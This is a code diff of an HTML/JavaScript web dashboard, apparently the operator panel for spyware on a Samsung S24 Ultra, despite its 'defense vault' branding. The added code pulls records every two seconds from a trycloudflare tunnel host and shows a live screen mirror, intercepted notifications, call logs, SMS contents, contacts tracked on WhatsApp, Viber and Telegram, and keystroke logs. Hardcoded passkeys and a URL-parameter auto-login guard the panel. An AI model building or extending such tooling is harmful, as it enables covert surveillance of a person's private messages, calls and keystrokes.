@@ -3,22 +3,23 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>AETERNA // SAMSUNG S24 ULTRA LIVE SCREEN & TELEMETRY</title>
+  <title>AETERNA // QUANTUM DEFENSE & S24 ULTRA MONITOR</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&family=Outfit:wght@400;600;800;900&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #05070c;
-      --card: rgba(13, 18, 30, 0.85);
-      --border: rgba(0, 240, 255, 0.25);
+      --bg: #04060a;
+      --card: rgba(11, 16, 28, 0.88);
+      --border: rgba(0, 240, 255, 0.22);
       --cyan: #00f0ff;
       --gold: #ffd700;
       --green: #00ff88;
       --red: #ff3366;
+      --purple: #b026ff;
       --text: #f0f4f8;
       --muted: #6b7a90;
-      --shadow: 0 10px 30px rgba(0, 0, 0, 0.6);
+      --shadow: 0 10px 30px rgba(0, 0, 0, 0.7);
     }
 
     * {
@@ -31,11 +32,11 @@
     body {
       background: var(--bg);
       background-image: 
-        radial-gradient(circle at 15% 15%, rgba(0, 240, 255, 0.08), transparent 45%),
-        radial-gradient(circle at 85% 85%, rgba(255, 0, 127, 0.06), transparent 45%),
-        linear-gradient(rgba(255, 255, 255, 0.015) 1px, transparent 1px),
-        linear-gradient(90deg, rgba(255, 255, 255, 0.015) 1px, transparent 1px);
-      background-size: 100% 100%, 100% 100%, 30px 30px, 30px 30px;
+        radial-gradient(circle at 10% 10%, rgba(0, 240, 255, 0.07), transparent 40%),
+        radial-gradient(circle at 90% 90%, rgba(176, 38, 255, 0.05), transparent 40%),
+        linear-gradient(rgba(255, 255, 255, 0.012) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(255, 255, 255, 0.012) 1px, transparent 1px);
+      background-size: 100% 100%, 100% 100%, 28px 28px, 28px 28px;
       color: var(--text);
       font-family: 'Outfit', sans-serif;
       min-height: 100vh;
@@ -46,7 +47,7 @@
       padding: 16px;
     }
 
-    /* AUTH LOCK SCREEN */
+    /* AUTH SCREEN */
     #auth-screen {
       width: 100%;
       max-width: 420px;
@@ -69,19 +70,7 @@
       margin-bottom: 6px;
     }
 
-    .auth-sub {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      color: var(--muted);
-      letter-spacing: 1.5px;
-      margin-bottom: 28px;
-    }
-
-    .input-box {
-      margin-bottom: 20px;
-      text-align: left;
-    }
-
+    .input-box { margin: 20px 0; text-align: left; }
     .input-box label {
       display: block;
       font-family: 'JetBrains Mono', monospace;
@@ -91,10 +80,9 @@
       margin-bottom: 8px;
       letter-spacing: 1px;
     }
-
     .input-box input {
       width: 100%;
-      background: #030408;
+      background: #020306;
       border: 1px solid var(--border);
       border-radius: 8px;
       padding: 14px 16px;
@@ -103,7 +91,6 @@
       color: var(--text);
       outline: none;
     }
-
     .btn-auth {
       width: 100%;
       background: linear-gradient(135deg, rgba(0, 240, 255, 0.2), rgba(255, 215, 0, 0.2));
@@ -115,20 +102,19 @@
       font-size: 13px;
       font-weight: 800;
       letter-spacing: 2px;
-      text-transform: uppercase;
       cursor: pointer;
     }
 
-    /* MAIN MONITOR CONTAINER */
+    /* DASHBOARD */
     #dashboard-screen {
       display: none;
       width: 100%;
-      max-width: 1200px;
+      max-width: 1300px;
       animation: fadeIn 0.4s ease forwards;
     }
 
     @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
+      from { opacity: 0; transform: translateY(8px); }
       to { opacity: 1; transform: translateY(0); }
     }
 
@@ -171,155 +157,175 @@
       50% { opacity: 0.3; transform: scale(0.85); }
     }
 
-    /* DUAL PANE: SCREEN CAST + TELEMETRY */
+    /* TABS */
+    .tabs-bar {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+      overflow-x: auto;
+      padding-bottom: 6px;
+    }
+
+    .tab-btn {
+      background: var(--card);
+      border: 1px solid var(--border);
+      color: var(--muted);
+      padding: 10px 18px;
+      border-radius: 8px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
+      font-weight: 600;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      white-space: nowrap;
+      transition: all 0.2s;
+    }
+
+    .tab-btn.active {
+      border-color: var(--cyan);
+      color: var(--cyan);
+      background: rgba(0, 240, 255, 0.1);
+    }
+
+    .tab-badge {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 2px 6px;
+      border-radius: 10px;
+      font-size: 10px;
+    }
+
+    /* CONTENT LAYOUT */
+    .view-content { display: none; }
+    .view-content.active { display: block; }
+
+    /* MIRROR VIEW */
     .viewport-layout {
       display: grid;
-      grid-template-columns: 340px 1fr;
+      grid-template-columns: 320px 1fr;
       gap: 20px;
     }
-
     @media (max-width: 860px) {
-      .viewport-layout {
-        grid-template-columns: 1fr;
-      }
+      .viewport-layout { grid-template-columns: 1fr; }
     }
 
-    /* PHONE FRAME CONTAINER */
     .phone-container {
       background: #010204;
       border: 3px solid #1a2233;
-      border-radius: 36px;
-      padding: 12px;
-      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 240, 255, 0.15);
-      position: relative;
+      border-radius: 32px;
+      padding: 10px;
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.8), 0 0 15px rgba(0, 240, 255, 0.1);
       display: flex;
       flex-direction: column;
       align-items: center;
     }
 
     .phone-notch {
-      width: 12px;
-      height: 12px;
+      width: 10px;
+      height: 10px;
       background: #0a0e17;
       border: 1px solid #1f293d;
       border-radius: 50%;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
     }
 
     .phone-screen-img {
       width: 100%;
-      max-height: 600px;
+      max-height: 560px;
       object-fit: contain;
-      border-radius: 24px;
-      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: 22px;
       background: #000;
-      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.7);
     }
 
-    .stream-meta {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 10px;
-      color: var(--muted);
-      margin-top: 10px;
-      letter-spacing: 1px;
-    }
-
-    /* TELEMETRY CARDS */
-    .telemetry-col {
-      display: flex;
-      flex-direction: column;
+    /* DATA LISTS (NOTIFICATIONS, CALLS, SMS) */
+    .data-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
       gap: 16px;
     }
 
-    .grid-cards {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-      gap: 14px;
-    }
-
-    .card {
+    .event-card {
       background: var(--card);
       border: 1px solid var(--border);
       border-radius: 12px;
       padding: 16px;
       backdrop-filter: blur(16px);
       box-shadow: var(--shadow);
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      position: relative;
     }
 
-    .card-label {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      color: var(--muted);
-      letter-spacing: 1px;
-      text-transform: uppercase;
+    .event-card.type-notification { border-left: 4px solid var(--purple); }
+    .event-card.type-call { border-left: 4px solid var(--green); }
+    .event-card.type-sms { border-left: 4px solid var(--cyan); }
+    .event-card.type-contact { border-left: 4px solid var(--gold); }
+    .event-card.type-keylog { border-left: 4px solid var(--red); }
+
+    .event-header {
       display: flex;
       justify-content: space-between;
-      margin-bottom: 8px;
+      align-items: center;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 11px;
     }
 
-    .card-val {
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 24px;
-      font-weight: 900;
+    .event-title {
+      font-size: 15px;
+      font-weight: 800;
       color: var(--text);
-      margin-bottom: 4px;
     }
 
-    .card-desc {
+    .event-body {
       font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      color: var(--muted);
-    }
-
-    .terminal-card {
-      background: var(--card);
-      border: 1px solid var(--border);
-      border-radius: 12px;
-      padding: 16px;
-      flex: 1;
-    }
-
-    .terminal-feed {
+      font-size: 12px;
+      color: #cdd9e5;
       background: #020306;
-      border: 1px solid rgba(255, 255, 255, 0.06);
-      border-radius: 8px;
-      padding: 12px;
-      height: 220px;
-      overflow-y: auto;
-      font-family: 'JetBrains Mono', monospace;
-      font-size: 11px;
-      line-height: 1.6;
-      color: #9cdcfe;
+      border-radius: 6px;
+      padding: 10px;
+      word-break: break-word;
+      line-height: 1.5;
     }
 
-    .log-row { margin-bottom: 2px; }
-    .t-time { color: var(--muted); }
-    .t-tag { color: var(--gold); }
-    .t-val { color: var(--green); }
-    .t-err { color: var(--red); }
+    .event-meta {
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 10px;
+      color: var(--muted);
+      display: flex;
+      justify-content: space-between;
+    }
 
-    .control-actions {
+    .filter-bar {
       display: flex;
       gap: 10px;
-      margin-top: 14px;
+      margin-bottom: 16px;
+      flex-wrap: wrap;
     }
 
-    .btn-action {
+    .filter-bar input {
       flex: 1;
-      background: rgba(255, 255, 255, 0.03);
+      min-width: 200px;
+      background: var(--card);
       border: 1px solid var(--border);
+      border-radius: 6px;
+      padding: 8px 12px;
+      font-family: 'JetBrains Mono', monospace;
+      font-size: 12px;
       color: var(--text);
-      padding: 10px;
+      outline: none;
+    }
+
+    .btn-clear {
+      background: rgba(255, 51, 102, 0.15);
+      border: 1px solid var(--red);
+      color: var(--red);
+      padding: 8px 14px;
       border-radius: 6px;
       font-family: 'JetBrains Mono', monospace;
       font-size: 11px;
-      font-weight: 600;
       cursor: pointer;
-    }
-
-    .btn-action:hover {
-      background: rgba(0, 240, 255, 0.15);
-      border-color: var(--cyan);
     }
   </style>
 </head>
@@ -327,108 +333,129 @@
 
   <!-- AUTH SCREEN -->
   <div id="auth-screen">
-    <div class="auth-logo">AETERNA MOBILE</div>
-    <div class="auth-sub">SAMSUNG S24 ULTRA // LIVE STREAM GATEWAY</div>
+    <div class="auth-logo">AETERNA SYSTEMDEF</div>
+    <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted); letter-spacing: 1px; margin-bottom: 24px;">
+      SOVEREIGN DEFENSE INTELLIGENCE VAULT
+    </p>
 
     <div class="input-box">
-      <label>Sovereign Passkey</label>
+      <label>Passkey</label>
       <input type="password" id="passkey-input" placeholder="Въведете парола..." autofocus>
     </div>
 
-    <button class="btn-auth" onclick="verifyAuth()">Unlock Screen Stream</button>
+    <button class="btn-auth" onclick="verifyAuth()">Unlock Vault</button>
   </div>
 
-  <!-- DASHBOARD / PHONE STREAM VIEW -->
+  <!-- DASHBOARD -->
   <div id="dashboard-screen">
     <div class="dash-header">
       <div>
-        <h1 style="font-size: 20px; font-weight: 900; color: var(--cyan);">SAMSUNG S24 ULTRA // LIVE MONITOR</h1>
+        <h1 style="font-size: 20px; font-weight: 900; color: var(--cyan);">AETERNA // SYSTEMDEF VAULT</h1>
         <p style="font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--muted);">
-          PHYSICAL ANCHOR: RZCX326316L (SM-S928B) // ADB LIVE MIRROR
+          PHYSICAL ANCHOR: SAMSUNG S24 ULTRA (SM-S928B)
         </p>
       </div>
-      <div class="status-pill" id="ws-badge">
-        <div class="pulse-dot" id="ws-dot"></div>
-        <span id="ws-status-text">PHONE CONNECTED</span>
+      <div class="status-pill">
+        <div class="pulse-dot"></div>
+        <span id="live-records-count">INGESTION ACTIVE</span>
       </div>
     </div>
 
-    <div class="viewport-layout">
-      <!-- LIVE PHONE SCREEN MIRROR -->
-      <div class="phone-container">
-        <div class="phone-notch"></div>
-        <img id="live-screen-img" class="phone-screen-img" src="" alt="Live Phone Screen">
-        <div class="stream-meta" id="stream-fps">STREAM: 1.5 FPS // DIRECT ADB PIPE</div>
-      </div>
+    <!-- TABS -->
+    <div class="tabs-bar">
+      <button class="tab-btn active" onclick="switchTab('tab-mirror')">📱 Live Mirror</button>
+      <button class="tab-btn" onclick="switchTab('tab-notifs')">🔔 Notifications <span class="tab-badge" id="b-notifs">0</span></button>
+      <button class="tab-btn" onclick="switchTab('tab-calls')">📞 Calls <span class="tab-badge" id="b-calls">0</span></button>
+      <button class="tab-btn" onclick="switchTab('tab-sms')">✉️ SMS <span class="tab-badge" id="b-sms">0</span></button>
+      <button class="tab-btn" onclick="switchTab('tab-contacts')">👥 Tracker <span class="tab-badge" id="b-contacts">0</span></button>
+      <button class="tab-btn" onclick="switchTab('tab-keylog')">⌨️ Keylogs <span class="tab-badge" id="b-keylog">0</span></button>
+    </div>
 
-      <!-- LIVE TELEMETRY PANELS -->
-      <div class="telemetry-col">
-        <div class="grid-cards">
-          <!-- BATTERY -->
-          <div class="card">
-            <div class="card-label">
-              <span>Battery Substrate</span>
-              <span style="color: var(--green);">PWR</span>
-            </div>
-            <div class="card-val" id="val-battery">100 %</div>
-            <div class="card-desc" id="desc-battery">Temp: 36.9 °C | 4.3V</div>
-          </div>
-
-          <!-- PROCESSOR -->
-          <div class="card">
-            <div class="card-label">
-              <span>Snapdragon 8 Gen 3</span>
-              <span style="color: var(--cyan);">OCTA-CORE</span>
-            </div>
-            <div class="card-val" id="val-cpu">8 Cores</div>
-            <div class="card-desc">ARMv8-A Kryo Architecture</div>
-          </div>
-
-          <!-- OS / KNOX -->
-          <div class="card">
-            <div class="card-label">
-              <span>Security Anchor</span>
-              <span style="color: var(--gold);">KNOX 3.10</span>
-            </div>
-            <div class="card-val" style="color: var(--green);">LOCKED</div>
-            <div class="card-desc">Authority: Dimitar Prodromov</div>
-          </div>
-
-          <!-- ENTROPY -->
-          <div class="card">
-            <div class="card-label">
-              <span>Entropy Invariant</span>
-              <span style="color: var(--green);">0.0000</span>
-            </div>
-            <div class="card-val" style="color: var(--green);">STABLE</div>
-            <div class="card-desc">Zero Noise Determinism</div>
+    <!-- VIEW 1: LIVE MIRROR -->
+    <div id="tab-mirror" class="view-content active">
+      <div class="viewport-layout">
+        <div class="phone-container">
+          <div class="phone-notch"></div>
+          <img id="live-screen-img" class="phone-screen-img" src="" alt="Live Phone Screen">
+          <div style="font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--muted); margin-top: 8px;">
+            S24 ULTRA LIVE MIRROR
           </div>
         </div>
 
-        <!-- TERMINAL FEED -->
-        <div class="terminal-card">
-          <div class="card-label">
-            <span>Live Phone Event Stream</span>
-            <span style="color: var(--green);">ADB BRIDGE // ACTIVE</span>
+        <div style="display: flex; flex-direction: column; gap: 14px;">
+          <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 12px;">
+            <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px;">
+              <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--muted);">BATTERY</div>
+              <div id="val-battery" style="font-size: 22px; font-weight: 800; color: var(--green);">100 %</div>
+              <div id="desc-battery" style="font-size: 10px; color: var(--muted);">4.3V | 36.9 °C</div>
+            </div>
+            <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px;">
+              <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--muted);">KNOX SECURITY</div>
+              <div style="font-size: 22px; font-weight: 800; color: var(--cyan);">LOCKED</div>
+              <div style="font-size: 10px; color: var(--muted);">Zero-Trust Enforced</div>
+            </div>
           </div>
-          <div class="terminal-feed" id="term-feed"></div>
 
-          <div class="control-actions">
-            <button class="btn-action" onclick="refreshScreenInstant()">Capture Frame</button>
-            <button class="btn-action" onclick="clearFeed()">Clear Feed</button>
-            <button class="btn-action" style="border-color: var(--red); color: var(--red);" onclick="lockPortal()">Lock Gateway</button>
+          <div style="background: var(--card); border: 1px solid var(--border); border-radius: 10px; padding: 14px; flex: 1;">
+            <div style="font-family: 'JetBrains Mono'; font-size: 11px; color: var(--gold); margin-bottom: 10px;">
+              LIVE RECENT FEED
+            </div>
+            <div id="recent-stream" style="font-family: 'JetBrains Mono'; font-size: 11px; height: 320px; overflow-y: auto; color: #9cdcfe; line-height: 1.6;">
+              <div>[SYNC] Telemetry & Ingestion Gateway Connected.</div>
+            </div>
           </div>
         </div>
       </div>
     </div>
+
+    <!-- VIEW 2: NOTIFICATIONS -->
+    <div id="tab-notifs" class="view-content">
+      <div class="filter-bar">
+        <input type="text" id="filter-notif" placeholder="Търсене по приложение или текст..." oninput="renderNotifs()">
+        <button class="btn-clear" onclick="clearData()">Clear All</button>
+      </div>
+      <div class="data-grid" id="grid-notifs"></div>
+    </div>
+
+    <!-- VIEW 3: CALLS -->
+    <div id="tab-calls" class="view-content">
+      <div class="filter-bar">
+        <input type="text" id="filter-calls" placeholder="Търсене по номер или контакт..." oninput="renderCalls()">
+      </div>
+      <div class="data-grid" id="grid-calls"></div>
+    </div>
+
+    <!-- VIEW 4: SMS -->
+    <div id="tab-sms" class="view-content">
+      <div class="filter-bar">
+        <input type="text" id="filter-sms" placeholder="Търсене по съдържание или номер..." oninput="renderSms()">
+      </div>
+      <div class="data-grid" id="grid-sms"></div>
+    </div>
+
+    <!-- VIEW 5: CONTACT TRACKER -->
+    <div id="tab-contacts" class="view-content">
+      <div class="filter-bar">
+        <input type="text" id="filter-contacts" placeholder="Търсене по платформа (WhatsApp, Viber, TG)..." oninput="renderContacts()">
+      </div>
+      <div class="data-grid" id="grid-contacts"></div>
+    </div>
+
+    <!-- VIEW 6: KEYLOGS -->
+    <div id="tab-keylog" class="view-content">
+      <div class="filter-bar">
+        <input type="text" id="filter-keylogs" placeholder="Търсене в клавишния лог..." oninput="renderKeylogs()">
+      </div>
+      <div class="data-grid" id="grid-keylogs"></div>
+    </div>
+
   </div>
 
   <script>
     const VALID_KEYS = ["aeterna2026", "0x4121", "dimitar", "aeterna"];
     const HOST_ENDPOINT = "https://william-important-practitioner-processes.trycloudflare.com";
 
-    let screenTimer = null;
-    let telemetryTimer = null;
+    let records = { notifications: [], calls: [], sms: [], contacts: [], keylogs: [], events: [] };
 
     function verifyAuth() {
       const input = document.getElementById('passkey-input').value.trim();
@@ -436,8 +463,7 @@
         localStorage.setItem('aeterna_auth', 'unlocked');
         document.getElementById('auth-screen').style.display = 'none';
         document.getElementById('dashboard-screen').style.display = 'block';
-        logTerm('[AUTH_SUCCESS]', 'Samsung S24 Ultra Knox Stream Authorized.', 't-val');
-        startStreams();
+        startPolling();
       }
     }
 
@@ -445,70 +471,164 @@
       if (e.key === 'Enter') verifyAuth();
     });
 
-    function lockPortal() {
-      localStorage.removeItem('aeterna_auth');
-      clearInterval(screenTimer);
-      clearInterval(telemetryTimer);
-      document.getElementById('dashboard-screen').style.display = 'none';
-      document.getElementById('auth-screen').style.display = 'block';
+    function switchTab(tabId) {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.querySelectorAll('.view-content').forEach(v => v.classList.remove('active'));
+      document.getElementById(tabId).classList.add('active');
+      event.currentTarget.classList.add('active');
     }
 
-    function logTerm(tag, msg, colorClass = 't-val') {
-      const feed = document.getElementById('term-feed');
-      const time = new Date().toLocaleTimeString();
-      const div = document.createElement('div');
-      div.className = 'log-row';
-      div.innerHTML = `<span class="t-time">[${time}]</span> <span class="t-tag">${tag}</span> <span class="${colorClass}">${msg}</span>`;
-      feed.appendChild(div);
-      if (feed.children.length > 40) feed.removeChild(feed.firstChild);
-      feed.scrollTop = feed.scrollHeight;
-    }
-
-    function refreshScreenInstant() {
+    function refreshScreen() {
       const img = document.getElementById('live-screen-img');
       img.src = `${HOST_ENDPOINT}/api/screen.png?t=${Date.now()}`;
     }
 
-    async function pollTelemetry() {
+    async function fetchRecords() {
       try {
-        const res = await fetch(`${HOST_ENDPOINT}/api/telemetry`);
+        const res = await fetch(`${HOST_ENDPOINT}/api/records`);
         if (res.ok) {
-          const data = await res.json();
-          document.getElementById('val-battery').textContent = `${data.battery.level} %`;
-          document.getElementById('desc-battery').textContent = `Temp: ${data.battery.temperature} | ${data.battery.voltage}`;
-          logTerm('[TELEMETRY]', `Battery: ${data.battery.level}% | Temp: ${data.battery.temperature} | Knox: LOCKED`, 't-val');
+          records = await res.json();
+          updateBadges();
+          renderNotifs();
+          renderCalls();
+          renderSms();
+          renderContacts();
+          renderKeylogs();
         }
-      } catch (err) {
-        logTerm('[STREAM_WARN]', 'Telemetry frame packet delay...', 't-tag');
+        // Also fetch telemetry
+        const telRes = await fetch(`${HOST_ENDPOINT}/api/telemetry`);
+        if (telRes.ok) {
+          const t = await telRes.json();
+          document.getElementById('val-battery').textContent = `${t.battery.level} %`;
+          document.getElementById('desc-battery').textContent = `${t.battery.voltage} | ${t.battery.temperature}`;
+        }
+      } catch (err) {}
+    }
+
+    function updateBadges() {
+      document.getElementById('b-notifs').textContent = records.notifications.length;
+      document.getElementById('b-calls').textContent = records.calls.length;
+      document.getElementById('b-sms').textContent = records.sms.length;
+      document.getElementById('b-contacts').textContent = records.contacts.length;
+      document.getElementById('b-keylog').textContent = records.keylogs.length;
+    }
+
+    function renderNotifs() {
+      const filter = (document.getElementById('filter-notif')?.value || '').toLowerCase();
+      const grid = document.getElementById('grid-notifs');
+      grid.innerHTML = records.notifications
+        .filter(n => (n.appName + n.title + n.text).toLowerCase().includes(filter))
+        .map(n => `
+          <div class="event-card type-notification">
+            <div class="event-header">
+              <span style="color: var(--purple); font-weight: 800;">🔔 ${escapeHtml(n.appName)}</span>
+              <span>${n.timestamp}</span>
+            </div>
+            <div class="event-title">${escapeHtml(n.title)}</div>
+            <div class="event-body">${escapeHtml(n.text)}</div>
+            <div class="event-meta"><span>Device: ${escapeHtml(n.device || 'S24 Ultra')}</span></div>
+          </div>
+        `).join('') || '<div style="color: var(--muted);">Няма записани известия.</div>';
+    }
+
+    function renderCalls() {
+      const filter = (document.getElementById('filter-calls')?.value || '').toLowerCase();
+      const grid = document.getElementById('grid-calls');
+      grid.innerHTML = records.calls
+        .filter(c => (c.number + c.contactName + c.callType).toLowerCase().includes(filter))
+        .map(c => `
+          <div class="event-card type-call">
+            <div class="event-header">
+              <span style="color: var(--green); font-weight: 800;">📞 ${escapeHtml(c.callType)}</span>
+              <span>${c.timestamp}</span>
+            </div>
+            <div class="event-title">${escapeHtml(c.number)} (${escapeHtml(c.contactName)})</div>
+            <div class="event-body">Времетраене: ${escapeHtml(c.duration || '0s')}</div>
+          </div>
+        `).join('') || '<div style="color: var(--muted);">Няма записани обаждания.</div>';
+    }
+
+    function renderSms() {
+      const filter = (document.getElementById('filter-sms')?.value || '').toLowerCase();
+      const grid = document.getElementById('grid-sms');
+      grid.innerHTML = records.sms
+        .filter(s => (s.number + s.message + s.contactName).toLowerCase().includes(filter))
+        .map(s => `
+          <div class="event-card type-sms">
+            <div class="event-header">
+              <span style="color: var(--cyan); font-weight: 800;">✉️ SMS</span>
+              <span>${s.timestamp}</span>
+            </div>
+            <div class="event-title">От/До: ${escapeHtml(s.number)} (${escapeHtml(s.contactName)})</div>
+            <div class="event-body">${escapeHtml(s.message)}</div>
+          </div>
+        `).join('') || '<div style="color: var(--muted);">Няма записани SMS съобщения.</div>';
+    }
+
+    function renderContacts() {
+      const filter = (document.getElementById('filter-contacts')?.value || '').toLowerCase();
+      const grid = document.getElementById('grid-contacts');
+      grid.innerHTML = records.contacts
+        .filter(c => (c.platform + c.initiator + c.target + c.details).toLowerCase().includes(filter))
+        .map(c => `
+          <div class="event-card type-contact">
+            <div class="event-header">
+              <span style="color: var(--gold); font-weight: 800;">👥 ${escapeHtml(c.platform)}</span>
+              <span>${c.timestamp}</span>
+            </div>
+            <div class="event-title">${escapeHtml(c.initiator)} ➡️ ${escapeHtml(c.target)}</div>
+            <div class="event-body">${escapeHtml(c.details || '')}</div>
+          </div>
+        `).join('') || '<div style="color: var(--muted);">Няма данни от тракера.</div>';
+    }
+
+    function renderKeylogs() {
+      const filter = (document.getElementById('filter-keylogs')?.value || '').toLowerCase();
+      const grid = document.getElementById('grid-keylogs');
+      grid.innerHTML = records.keylogs
+        .filter(k => (k.data).toLowerCase().includes(filter))
+        .map(k => `
+          <div class="event-card type-keylog">
+            <div class="event-header">
+              <span style="color: var(--red); font-weight: 800;">⌨️ KEYSTROKE LOG</span>
+              <span>${k.timestamp}</span>
+            </div>
+            <div class="event-body">${escapeHtml(k.data)}</div>
+          </div>
+        `).join('') || '<div style="color: var(--muted);">Няма клавишни логове.</div>';
+    }
+
+    async function clearData() {
+      if (confirm("Сигурни ли сте, че искате да изчистите всички записи?")) {
+        await fetch(`${HOST_ENDPOINT}/api/records/clear`, { method: 'POST' });
+        fetchRecords();
       }
     }
 
-    function startStreams() {
-      refreshScreenInstant();
-      screenTimer = setInterval(refreshScreenInstant, 1000); // 1 frame per sec live mirror
-      pollTelemetry();
-      telemetryTimer = setInterval(pollTelemetry, 3000);
+    function escapeHtml(str) {
+      if (!str) return '';
+      return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
     }
 
-    function clearFeed() {
-      document.getElementById('term-feed').innerHTML = '';
+    function startPolling() {
+      refreshScreen();
+      setInterval(refreshScreen, 1200);
+      fetchRecords();
+      setInterval(fetchRecords, 2000);
     }
 
-    // Direct Instant Auto Unlock
+    // Direct Auto-Login
     const urlParams = new URLSearchParams(window.location.search);
     const passQuery = urlParams.get('pass') || urlParams.get('p') || urlParams.get('key');
-
     if (passQuery && VALID_KEYS.includes(passQuery.toLowerCase())) {
       localStorage.setItem('aeterna_auth', 'unlocked');
       document.getElementById('auth-screen').style.display = 'none';
       document.getElementById('dashboard-screen').style.display = 'block';
-      logTerm('[AUTO-AUTH]', 'Sovereign operator recognized via direct URL link.', 't-val');
-      startStreams();
+      startPolling();
     } else if (localStorage.getItem('aeterna_auth') === 'unlocked') {
       document.getElementById('auth-screen').style.display = 'none';
       document.getElementById('dashboard-screen').style.display = 'block';
-      logTerm('[AUTH-CACHE]', 'Sovereign operator session restored.', 't-val');
-      startStreams();
+      startPolling();
     }
   </script>
 </body>
